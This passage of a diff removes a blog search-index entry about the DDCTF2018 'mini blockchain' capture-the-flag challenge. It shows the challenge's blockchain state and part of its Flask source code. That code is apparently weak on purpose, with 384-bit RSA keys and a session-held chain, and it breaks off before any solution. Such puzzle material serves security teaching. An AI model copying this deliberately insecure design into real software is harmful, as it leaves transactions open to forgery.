@@ -20309,389 +20309,6 @@ my <span class="token variable">$file</span><span class="token operator">=</span
 ]]></content>
   </entry>
   <entry>
-    <title>DDCTF2018：mini blockchain</title>
-    <url>/2021/11/01/ddctf2018-mini-blockchain/</url>
-    <content><![CDATA[<p><img src="/2021/11/01/ddctf2018-mini-blockchain/image-20211101145544001.png" alt="image-20211101145544001"></p>
-<pre class=" language-json"><code class="language-json">Announcement<span class="token operator">:</span> The server has been restarted at <span class="token number">21</span><span class="token operator">:</span><span class="token number">45</span> <span class="token number">04</span>/<span class="token number">17</span>. All blockchain have been reset. View source code
-
-hash of genesis block<span class="token operator">:</span> 3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962
-
-the bank's addr<span class="token operator">:</span> b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b<span class="token punctuation">,</span> 
-the hacker's addr<span class="token operator">:</span> a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b<span class="token punctuation">,</span> 
-the shop's addr<span class="token operator">:</span> d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071
-
-Balance of all addresses<span class="token operator">:</span><span class="token punctuation">{</span>
-    <span class="token property">"d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
-    <span class="token property">"b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
-    <span class="token property">"a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
-    <span class="token property">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
-    <span class="token property">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token operator">:</span> <span class="token number">1</span>
-<span class="token punctuation">}</span>
-
-All utxos<span class="token operator">:</span> <span class="token punctuation">{</span>
-    <span class="token property">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
-        <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> 
-        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5"</span><span class="token punctuation">,</span> 
-        <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
-        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span>
-        <span class="token punctuation">}</span><span class="token punctuation">,</span> 
-    <span class="token property">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
-        <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
-        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64"</span><span class="token punctuation">,</span> 
-        <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token punctuation">,</span> 
-        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span>
-        <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-
-Blockchain Explorer<span class="token operator">:</span> <span class="token punctuation">{</span>
-    <span class="token property">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
-        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"HAHA, I AM THE BANK NOW!"</span><span class="token punctuation">,</span> 
-        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token punctuation">,</span>
-        <span class="token property">"hash"</span><span class="token operator">:</span><span class="token string">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token punctuation">,</span> 
-        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
-            <span class="token property">"input"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"845e6673-ad33-4645-97f6-ef4f8895e82c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
-            <span class="token property">"signature"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"0f808f1d3b6016c2f5a06e00602c3d4ffaac76efb04eb97f8ff9f76ed745b58f357ad7dab38d33bc7229f7b1df158034"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
-            <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"7ce1d7a76757c181593b3e02433b24d05d86133ca0c9c5bcb46371e3846f0fbe"</span><span class="token punctuation">,</span> 
-            <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
-                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
-                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64"</span><span class="token punctuation">,</span> 
-                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token punctuation">,</span> 
-                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span>
-            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
-                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> 
-                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5"</span><span class="token punctuation">,</span> 
-                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
-                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span>
-            <span class="token punctuation">}</span><span class="token punctuation">]</span>
-        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
-        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">1</span>
-    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
-    <span class="token property">"e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
-        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"a empty block"</span><span class="token punctuation">,</span> 
-        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token punctuation">,</span> 
-        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616"</span><span class="token punctuation">,</span> 
-        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
-        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">2</span>
-    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
-    <span class="token property">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
-        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"The Times 03/Jan/2009 Chancellor on brink of second bailout for bank"</span><span class="token punctuation">,</span> 
-        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span> 
-        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token punctuation">,</span> 
-        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
-            <span class="token property">"input"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
-            <span class="token property">"signature"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
-            <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"c3a654c05dc934708f962d78dd795768132256a7d64c866439975a43024e15ec"</span><span class="token punctuation">,</span> 
-            <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
-                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1000000</span><span class="token punctuation">,</span> 
-                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8cb6994bbb901d94bda4388669f42c65a08685526e977d2a09ae69568d590aca"</span><span class="token punctuation">,</span> 
-                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
-                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"845e6673-ad33-4645-97f6-ef4f8895e82c"</span>
-            <span class="token punctuation">}</span><span class="token punctuation">]</span>
-        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
-        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">0</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span></code></pre>
-<p>View source_code:</p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- encoding: utf-8 -*-</span>
-<span class="token comment" spellcheck="true"># written in python 2.7</span>
-__author__ <span class="token operator">=</span> <span class="token string">'garzon'</span>
-
-<span class="token keyword">import</span> hashlib<span class="token punctuation">,</span> json<span class="token punctuation">,</span> rsa<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> os
-<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request
-<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> PyCallGraph  
-<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> Config  
-<span class="token keyword">from</span> pycallgraph<span class="token punctuation">.</span>output <span class="token keyword">import</span> GraphvizOutput 
-
-app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
-app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>
-url_prefix <span class="token operator">=</span> <span class="token string">''</span>
-
-<span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> <span class="token string">'Here is your flag: DDCTF{******************}'</span>
-
-<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">hash_reducer</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> hash<span class="token punctuation">(</span>hash<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span>hash<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">has_attrs</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> attrs<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> type<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Input should be a dict/JSON"</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> attr <span class="token keyword">in</span> attrs<span class="token punctuation">:</span>
-        <span class="token keyword">if</span> attr <span class="token operator">not</span> <span class="token keyword">in</span> d<span class="token punctuation">:</span>
-            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"{} should be presented in the input"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-EMPTY_HASH <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">*</span><span class="token number">64</span>
-
-<span class="token keyword">def</span> <span class="token function">addr_to_pubkey</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">(</span>int<span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">pubkey_to_address</span><span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">assert</span> pubkey<span class="token punctuation">.</span>e <span class="token operator">==</span> <span class="token number">65537</span>
-    hexed <span class="token operator">=</span> hex<span class="token punctuation">(</span>pubkey<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
-    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
-    <span class="token keyword">return</span> hexed
-
-<span class="token keyword">def</span> <span class="token function">gen_addr_key_pair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    pubkey<span class="token punctuation">,</span> privkey <span class="token operator">=</span> rsa<span class="token punctuation">.</span>newkeys<span class="token punctuation">(</span><span class="token number">384</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> pubkey_to_address<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">,</span> privkey
-
-bank_address<span class="token punctuation">,</span> bank_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
-hacker_address<span class="token punctuation">,</span> hacker_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
-shop_address<span class="token punctuation">,</span> shop_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
-shop_wallet_address<span class="token punctuation">,</span> shop_wallet_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">sign_input_utxo</span><span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">,</span> <span class="token string">'SHA-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">hash_utxo</span><span class="token punctuation">(</span>utxo<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">create_output_utxo</span><span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    utxo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">:</span> addr_to<span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> amount<span class="token punctuation">}</span>
-    utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> utxo
-
-<span class="token keyword">def</span> <span class="token function">hash_tx</span><span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>
-        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">,</span>
-        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span>
-    <span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">create_tx</span><span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> output_utxo<span class="token punctuation">,</span> privkey_from<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    tx <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'input'</span><span class="token punctuation">:</span> input_utxo_ids<span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>sign_input_utxo<span class="token punctuation">(</span>id<span class="token punctuation">,</span> privkey_from<span class="token punctuation">)</span> <span class="token keyword">for</span> id <span class="token keyword">in</span> input_utxo_ids<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">:</span> output_utxo<span class="token punctuation">}</span>
-    tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> tx
-
-<span class="token keyword">def</span> <span class="token function">hash_block</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">create_block</span><span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">,</span> nonce_str<span class="token punctuation">,</span> transactions<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> type<span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'prev_block_hash should be hex-encoded hash value'</span><span class="token punctuation">)</span>
-    nonce <span class="token operator">=</span> str<span class="token punctuation">(</span>nonce_str<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> len<span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">128</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'the nonce is too long'</span><span class="token punctuation">)</span>
-    block <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'prev'</span><span class="token punctuation">:</span> prev_block_hash<span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">:</span> nonce<span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">:</span> transactions<span class="token punctuation">}</span>
-    block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_block<span class="token punctuation">(</span>block<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> block
-
-<span class="token keyword">def</span> <span class="token function">find_blockchain_tail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> max<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> block<span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">calculate_utxo</span><span class="token punctuation">(</span>blockchain_tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    curr_block <span class="token operator">=</span> blockchain_tail
-    blockchain <span class="token operator">=</span> <span class="token punctuation">[</span>curr_block<span class="token punctuation">]</span>
-    <span class="token keyword">while</span> curr_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-        curr_block <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>curr_block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
-        blockchain<span class="token punctuation">.</span>append<span class="token punctuation">(</span>curr_block<span class="token punctuation">)</span>
-    blockchain <span class="token operator">=</span> blockchain<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
-    utxos <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
-    <span class="token keyword">for</span> block <span class="token keyword">in</span> blockchain<span class="token punctuation">:</span>
-        <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-            <span class="token keyword">for</span> input_utxo_id <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-                <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>input_utxo_id<span class="token punctuation">]</span>
-            <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
-                utxos<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> utxo
-    <span class="token keyword">return</span> utxos
-
-<span class="token keyword">def</span> <span class="token function">calculate_balance</span><span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    balance <span class="token operator">=</span> <span class="token punctuation">{</span>bank_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> hacker_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> shop_address<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>
-    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> balance<span class="token punctuation">:</span>
-            balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
-        balance<span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
-    <span class="token keyword">return</span> balance
-
-<span class="token keyword">def</span> <span class="token function">verify_utxo_signature</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">except</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> <span class="token boolean">False</span>
-
-<span class="token keyword">def</span> <span class="token function">append_block</span><span class="token punctuation">(</span>block<span class="token punctuation">,</span> difficulty<span class="token operator">=</span>int<span class="token punctuation">(</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    has_attrs<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">,</span> <span class="token string">'nonce'</span><span class="token punctuation">,</span> <span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-    <span class="token keyword">if</span> type<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
